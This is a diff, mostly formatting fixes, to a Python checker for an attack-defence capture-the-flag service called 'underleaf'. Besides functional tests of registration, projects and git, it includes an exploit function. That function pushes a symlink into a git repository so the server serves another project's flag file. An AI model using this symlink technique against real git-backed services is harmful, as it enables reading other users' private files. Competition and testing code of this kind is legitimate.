@@ -11,9 +11,10 @@ from httpx import AsyncClient, Response, RequestError
 service_port = 4242
 
 checker = Enochecker("underleaf", service_port)
-app = lambda: checker.app
+def app(): return checker.app
 
-def response_ok(response: Response, message:str, logger: LoggerAdapter) -> dict:
+
+def response_ok(response: Response, message: str, logger: LoggerAdapter) -> dict:
     assert_equals(response.status_code, 200, message)
 
     try:
@@ -24,7 +25,7 @@ def response_ok(response: Response, message:str, logger: LoggerAdapter) -> dict:
     assert_in("status", json, "test")
     if json["status"] != "ok" and logger is not None:
         logger.debug(json["message"])
-        
+
     assert_equals(json["status"], "ok", "message")
 
     return json
@@ -39,7 +40,7 @@ async def register_user(client: AsyncClient, logger: LoggerAdapter) -> Tuple[str
         raise MumbleException("request error while registering in")
 
     assert_equals(response.status_code, 200, "registration failed")
-    
+
     json = response_ok(response, "registration failed", logger)
 
     assert_in("token", json, "registration failed")
@@ -48,6 +49,7 @@ async def register_user(client: AsyncClient, logger: LoggerAdapter) -> Tuple[str
     client.headers["Authorization"] = f"Bearer {json['token']}"
 
     return username, password, json["token"]
+
 
 async def login_user(client: AsyncClient, username: str, password: str, logger: LoggerAdapter) -> None:
     try:
@@ -61,6 +63,7 @@ async def login_user(client: AsyncClient, username: str, password: str, logger: 
     assert_equals(True, len(json["token"]) > 0, "registration failed")
 
     client.headers["Authorization"] = f"Bearer {json['token']}"
+
 
 async def create_project(client: AsyncClient, logger: LoggerAdapter) -> Tuple[str, str]:
     project_name = secrets.token_hex(8)
@@ -76,6 +79,7 @@ async def create_project(client: AsyncClient, logger: LoggerAdapter) -> Tuple[st
 
     return project_name, json["id"]
 
+
 async def upload_file(client: AsyncClient, project_id: str, filename: str, data: str, logger: LoggerAdapter) -> None:
     if not filename.startswith("/"):
         filename = f"/{filename}"
@@ -86,6 +90,7 @@ async def upload_file(client: AsyncClient, project_id: str, filename: str, data:
         raise MumbleException("request error while uploading file")
 
     response_ok(response, "uploading file failed", logger)
+
 
 async def download_file(client: AsyncClient, project_id: str, filename: str, logger: LoggerAdapter) -> str:
     if not filename.startswith("/"):
@@ -100,6 +105,7 @@ async def download_file(client: AsyncClient, project_id: str, filename: str, log
 
     return response.content.decode('utf-8')
 
+
 async def commit(client: AsyncClient, project_id: str, message: str, logger: LoggerAdapter) -> None:
     try:
         response = await client.post(f"/api/git/commit/{project_id}", data={"message": message}, follow_redirects=True)
@@ -107,6 +113,7 @@ async def commit(client: AsyncClient, project_id: str, message: str, logger: Log
         raise MumbleException("request error while committing")
 
     response_ok(response, "committing failed", logger)
+
 
 async def push(client: AsyncClient, project_id: str, logger: LoggerAdapter) -> None:
     try:
@@ -116,6 +123,7 @@ async def push(client: AsyncClient, project_id: str, logger: LoggerAdapter) -> N
 
     response_ok(response, "pushing failed", logger)
 
+
 async def pull(client: AsyncClient, project_id: str, logger: LoggerAdapter) -> None:
     try:
         response = await client.get(f"/api/git/pull/{project_id}", follow_redirects=True)
@@ -124,11 +132,12 @@ async def pull(client: AsyncClient, project_id: str, logger: LoggerAdapter) -> N
 
     response_ok(response, "pulling failed", logger)
 
+
 @checker.putflag(0)
 async def putflag_zero(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
     (username, password, _) = await register_user(client, logger)
     await db.set("credentials", (username, password))
-    
+
     (name, id) = await create_project(client, logger)
     await db.set("project", (name, id))
 
@@ -136,8 +145,9 @@ async def putflag_zero(task: PutflagCheckerTaskMessage, client: AsyncClient, db:
 
     return id
 
+
 @checker.getflag(0)
-async def getflag_zero(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:    
+async def getflag_zero(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
     try:
         (username, password) = await db.get("credentials")
     except KeyError:
@@ -150,12 +160,13 @@ async def getflag_zero(task: GetflagCheckerTaskMessage, client: AsyncClient, db:
     except KeyError:
         raise MumbleException("Missing database entry from putflag")
 
-
     assert_equals(await download_file(client, id, 'main.tex', logger), task.flag, "flag dose not match")
+
 
 def os_succ(code):
     if code != 0:
         raise Exception("Internal error os command failed")
+
 
 @checker.havoc(0)
 async def havoc_test_git(task: HavocCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter) -> None:
@@ -174,25 +185,30 @@ async def havoc_test_git(task: HavocCheckerTaskMessage, client: AsyncClient, log
 
     # clone the repo onto the checker
     git_url = f"http://{username}:{password}@{task.address}:{service_port}/git/{id}"
-    
+
     if os.system(f"git -C /tmp/ clone {git_url} {dev_null}") != 0:
         raise MumbleException("git clone failed")
 
     # check, that the file is present
     assert_equals(os.path.exists(f"/tmp/{id}/"), True, "git clone failed")
-    assert_equals(os.path.exists(f"/tmp/{id}/main.tex"), True, "file not created")
-    assert_equals(open("/tmp/{id}/main.tex".format(id=id)).read(), file_content, "file content does not match")
+    assert_equals(os.path.exists(
+        f"/tmp/{id}/main.tex"), True, "file not created")
+    assert_equals(open("/tmp/{id}/main.tex".format(id=id)
+                       ).read(), file_content, "file content does not match")
 
     # add a file locally
     new_file_content = secrets.token_hex(32)
     open(f"/tmp/{id}/newFile.tex", "w").write(new_file_content)
 
     # commit it
-    os_succ(os.system(f"git -C /tmp/{id} config user.email \"{username}@example.com\" {dev_null}"))
-    os_succ(os.system(f"git -C /tmp/{id} config user.name \"{username}\" {dev_null}"))
-    
+    os_succ(os.system(
+        f"git -C /tmp/{id} config user.email \"{username}@example.com\" {dev_null}"))
+    os_succ(
+        os.system(f"git -C /tmp/{id} config user.name \"{username}\" {dev_null}"))
+
     os_succ(os.system(f"git -C /tmp/{id} add . {dev_null}"))
-    os_succ(os.system(f"git -C /tmp/{id} commit -m 'Added newFile.tex' {dev_null}"))
+    os_succ(
+        os.system(f"git -C /tmp/{id} commit -m 'Added newFile.tex' {dev_null}"))
 
     # push it onto the server
     if os.system(f"git -C /tmp/{id} push {dev_null}") != 0:
@@ -206,7 +222,9 @@ async def havoc_test_git(task: HavocCheckerTaskMessage, client: AsyncClient, log
 
     # download the file
     new_file_content_dl = await download_file(client, id, "newFile.tex", logger)
-    assert_equals(new_file_content_dl, new_file_content, "file content does not match")
+    assert_equals(new_file_content_dl, new_file_content,
+                  "file content does not match")
+
 
 @checker.exploit(0)
 async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter) -> str:
@@ -217,13 +235,14 @@ async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, log
 
     # clone the repo onto the checker
     git_url = f"http://{username}:{password}@{task.address}:{service_port}/git/{id}"
-    
+
     if os.system(f"git -C /tmp/ clone {git_url} {dev_null}") != 0:
         raise MumbleException("git clone failed")
 
     # check, that the file is present
     assert_equals(os.path.exists(f"/tmp/{id}/"), True, "git clone failed")
-    assert_equals(os.path.exists(f"/tmp/{id}/main.tex"), True, "file not created")
+    assert_equals(os.path.exists(
+        f"/tmp/{id}/main.tex"), True, "file not created")
 
     # add a symlink
     f_id = task.attack_info
@@ -235,9 +254,11 @@ async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, log
     os_succ(os.system(f"rm -rf {target} {dev_null}"))
 
     # commit it
-    os_succ(os.system(f"git -C /tmp/{id} config user.email \"{username}@example.com\" {dev_null}"))
-    os_succ(os.system(f"git -C /tmp/{id} config user.name \"{username}\" {dev_null}"))
-    
+    os_succ(os.system(
+        f"git -C /tmp/{id} config user.email \"{username}@example.com\" {dev_null}"))
+    os_succ(
+        os.system(f"git -C /tmp/{id} config user.name \"{username}\" {dev_null}"))
+
     os_succ(os.system(f"git -C /tmp/{id} add . {dev_null}"))
     os_succ(os.system(f"git -C /tmp/{id} commit -m 'Exploit!' {dev_null}"))
 
@@ -252,8 +273,7 @@ async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, log
     await pull(client, id, logger)
 
     # get flag
-    return await download_file(client, id, "link", logger)    
-
+    return await download_file(client, id, "link", logger)
 
 if __name__ == "__main__":
     checker.run()
